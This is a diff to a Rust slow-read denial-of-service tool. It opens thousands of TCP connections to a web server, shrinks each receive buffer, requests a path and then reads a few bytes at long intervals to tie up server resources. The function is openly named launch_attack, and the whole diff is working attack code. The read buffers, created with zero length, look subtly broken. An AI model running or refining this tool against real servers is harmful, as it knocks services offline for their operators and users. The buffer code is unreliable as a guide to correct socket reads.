@@ -26,8 +26,14 @@ struct Options {
     #[structopt(short = "a", long = "address")]
     address: String,
 
-    #[structopt(short = "b", long = "buffer-size", default_value = "128")]
-    buffer_size: usize,
+    #[structopt(short = "p", long = "path", default_value = "/")]
+    path: String,
+
+    #[structopt(short = "b", long = "recv-buffer-size", default_value = "2304", parse(from_str = "parse_recv_buffer_size"))]
+    recv_buffer_size: usize,
+
+    #[structopt(short = "r", long = "read-len", default_value = "5")]
+    read_len: usize,
 
     #[structopt(short = "c", long = "connections", default_value = "10000")]
     connections: usize,
@@ -41,6 +47,10 @@ struct Options {
 fn parse_duration(src: &str) -> Duration {
     let millis: u64 = src.parse().unwrap();
     Duration::from_millis(millis)
+}
+
+fn parse_recv_buffer_size(src: &str) -> usize {
+    src.parse::<usize>().unwrap() / 2
 }
 
 fn main() {
@@ -77,10 +87,10 @@ fn main() {
 
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
     tcp_stream
-        .set_recv_buffer_size(options.buffer_size)
+        .set_recv_buffer_size(options.recv_buffer_size)
         .unwrap();
 
-    println!("Changing buffer size to {} bytes", options.buffer_size);
+    println!("Changing buffer size to {} bytes", options.recv_buffer_size);
     println!(
         "Buffer size actually changed to {} bytes",
         tcp_stream.recv_buffer_size().unwrap()
@@ -92,8 +102,7 @@ fn main() {
         futures.push(launch_attack(
             &socket_addr,
             &url,
-            options.buffer_size,
-            options.wait_time.clone(),
+            &options,
         ));
     }
 
@@ -103,30 +112,35 @@ fn main() {
 fn launch_attack(
     socket_addr: &SocketAddr,
     url: &str,
-    buffer_size: usize,
-    wait_time: Duration,
-) -> impl Future<Item = (Option<TcpStream>, [u8; 1]), Error = TimerError> {
+    options: &Options,
+) -> impl Future<Item = (Option<TcpStream>, Vec<u8>), Error = TimerError> {
+    let wait_time = options.wait_time.clone();
+    let path = &options.path;
+    let read_len = options.read_len;
+
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
 
-    tcp_stream.set_recv_buffer_size(buffer_size).unwrap();
+    tcp_stream.set_recv_buffer_size(options.recv_buffer_size).unwrap();
 
-    let request = Request::get(url).body(()).unwrap();
+    let request = Request::get(url.to_owned() + path).body(()).unwrap();
     let request = build_http_request(&request);
 
     io::write_all(&tcp_stream, request).wait().unwrap();
 
-    let buf: [u8; 1] = [0; 1];
+    let buf: Vec<u8> = Vec::with_capacity(read_len);
+
+    let (tcp_stream, buf) = io::read_exact(tcp_stream, buf).wait().unwrap();
 
     loop_fn((Some(tcp_stream), buf), move |(tcp_stream_option, _buf)| {
         let tcp_stream = tcp_stream_option.unwrap();
 
-        Timer::default().sleep(wait_time).and_then(|_| {
-            let buf: [u8; 1] = [0; 1];
+        Timer::default().sleep(wait_time).and_then(move |_| {
+            let buf: Vec<u8> = Vec::with_capacity(read_len);
 
             io::read_exact(tcp_stream, buf)
                 .and_then(|(tcp_stream, buf)| Ok(Loop::Continue((Some(tcp_stream), buf))))
-                .or_else(|_| {
-                    let buf: [u8; 1] = [0; 1];
+                .or_else(move |_| {
+                    let buf: Vec<u8> = Vec::with_capacity(read_len);
                     Ok(Loop::Break((None, buf)))
                 })
         })
